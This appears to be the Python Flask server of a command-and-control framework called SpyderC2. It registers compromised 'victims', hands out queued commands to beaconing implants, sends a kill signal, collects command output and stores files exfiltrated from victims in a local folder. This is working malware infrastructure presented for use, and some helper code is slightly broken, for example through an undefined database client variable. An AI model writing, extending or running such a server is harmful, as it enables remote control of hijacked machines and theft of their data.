from flask import Flask,request
from pathlib import Path
import  os
import pymongo
import logging
import pdb
import base64
from lib.logger import Logger
from termcolor import colored
import pdb
import time
import sys


def main(mongoclient,server_logger,port):
	app = Flask('app')

	## Get the cookie/victim ID from a request
	def get_cookie(request):
		d = request.cookies
		if d:
			return base64.b64decode(d.to_dict()['session']).decode()
		else:
			return False


	def get_victim_info(request):
		return request.form.to_dict()


	## Insert the command output in the Database
	def insert_cmd_output(output,victim_id,task_id):
		mydb = myclient[os.environ['MONGODB_DATABASE']]
		cmds = mydb["commands"]
		h = {'victim_id':victim_id,'task_id':task_id}
		cmds.find_one_and_update(h,{ "$set": { "output": output } })


	## Checks if we are running on docker container
	def docker():
		return os.path.isfile('/.dockerenv')

	####################################### General beacon and sends task  ####################################

	@app.route('/',methods = ['GET', 'POST'])
	def run():
		myclient = mongoclient
		if request.method == 'GET':
			mydb = myclient[os.environ['MONGODB_DATABASE']]
			cmds = mydb["commands"]
			
			victim_id = get_cookie(request)

			## Update last seen
			if victim_id:
				if victim_id in Victim.victims.keys():
					victim_obj = Victim.victims[victim_id]
					victim_obj.update_last_seen_status_to_db()
					server_logger.info_log(f"Updated last seen of {victim_obj.victim_id}")

			task = Task.find_unissued_task(victim_id)

			## If there is any task
			if task:
				if task['command'] == 'kill':

					## Kill the victim by sending 'Die' and also update db
					Victim.victims[victim_id].status = 'Dead'
					Victim.victims[victim_id].update_last_seen_status_to_db()
					return 'Die'
				else:
					task_obj = Task.load_task(task)
					task_dict = task_obj.issue_dict()
					server_logger.info_log(f"Task issued, task id - {colored(task_dict['task_id'],'cyan')}",'green')
					server_logger.info_log(f"Task info - {task_dict}",'green')
					return task_dict

			## Default reply of server incase no commands
			return 'Nothing Fishy going on here :)'

		## Not needed remove.
		if request.method == 'POST':

			print("Command to exfiltrate recieved...")
			if not os.path.exists('./exfiltration'):
				os.mkdir('./exfiltration')
			## wb enables to write bianry
			with open('./exfiltration/'+request.headers['Filename'], "wb") as f:
				# Write bytes to file
				f.write(request.data)
			f.close()
			return "OK"

	####################################### Task output handler  ####################################

	@app.route('/<cmd>/output/<task_id>',methods = ['POST'])


	def task_output(cmd,task_id):
		if request.method == 'POST':
			victim_id = get_cookie(request)

			
			## Handling for various kind of tasks, also passing the task/module options set by user
			output = Module.module_task_id[task_id].handle_task_output(request.data,Task.tasks[task_id].options,victim_id,task_id)

			server_logger.info_log(f"Recieved task output for task ID - {task_id} , Victim ID - {victim_id} , Command - {cmd}, Output - {colored('File dumped to '+output.split('../../')[1],'cyan')} accessible both though host and container.",'green')

			
			task_obj = Task.tasks[task_id]
			task_obj.insert_cmd_output(f"File dumped to {output.split('../../')[1]} accessible both though host and container")

			return "OK"

		
	####################################### Staging / Initial request from the victim  ####################################

	@app.route('/stage_0',methods = ['POST'])
	def stage():
		if request.method == 'POST':
			myclient = mongoclient

			mydb = myclient[os.environ['MONGODB_DATABASE']]
			cmds = mydb["commands"]
			victims = mydb['victims']


			## Get the victim id of the new victim
			victim_id = get_cookie(request)

			## Get the other info about the victim
			info = get_victim_info(request)
			

			if victim_id:
				## instantiate a new victim object
				victim_obj = Victim(victim_id = victim_id,platform = info['platform'],os_version = info['version'],admin = info['admin'],location= info['location'])


				if victim_obj:
					server_logger.info_log(f"New victim checked in - {victim_id} , {info['platform']}",'green')
					return ('Victim registered', 200)
				else:
					return ('Victim already registered', 302)

			return ('Bad request', 400)


	####################################### Client Error Recieved  ####################################

	@app.route('/clienterror',methods = ['POST'])
	def clienterror():
		if request.method == 'POST':
			server_logger.info_log(f"Recieved error from victim - {request.data.decode('utf-8')}",'yellow')

			return ('Error Recieved, we will get back to you', 200)

	app.run(host = '0.0.0.0', port = port)

def get_db_info():
	if 'MONGODB_USERNAME' not in os.environ: 
		os.environ['MONGODB_USERNAME'] = ''

	if 'MONGODB_PASSWORD' not in os.environ: 
		os.environ['MONGODB_PASSWORD'] = ''

	if 'MONGODB_HOSTNAME' not in os.environ: 
		os.environ['MONGODB_HOSTNAME'] = '127.0.0.1'

	if 'MONGODB_DATABASE' not in os.environ: 
		os.environ['MONGODB_DATABASE'] = 'SpyderC2'

	print(colored("You can set these environment variables - MONGODB_USERNAME , MONGODB_PASSWORD , MONGODB_HOSTNAME , MONGODB_DATABASE",'blue'))

	db_url = "mongodb://"
	if os.environ['MONGODB_USERNAME'] != '' and os.environ['MONGODB_PASSWORD'] != '':
		db_url += f"{os.environ['MONGODB_USERNAME']}:{os.environ['MONGODB_PASSWORD']}@"
		
	db_url += f"{os.environ['MONGODB_HOSTNAME']}:27017/{os.environ['MONGODB_DATABASE']}"

	return db_url



if __name__=="__main__":
	if len(sys.argv) >= 2:
		port = sys.argv[1]
	else:
		port = '8080'
	
	server_logger = Logger(logdir='logs',logfile='logs',verbose=False )
	server_logger.setup()

	db_url = get_db_info()
	

	from lib.database import Database
	from lib.module import Module
	from lib.task import Task
	from lib.victim import Victim

	db_object = Database(url=db_url)
	server_logger.info_log(f"Initiated database connection from main- {db_url}",'green')
	
	Victim.mongoclient = db_object.mongoclient
	Task.mongoclient = db_object.mongoclient
	main(db_object.mongoclient,server_logger,port)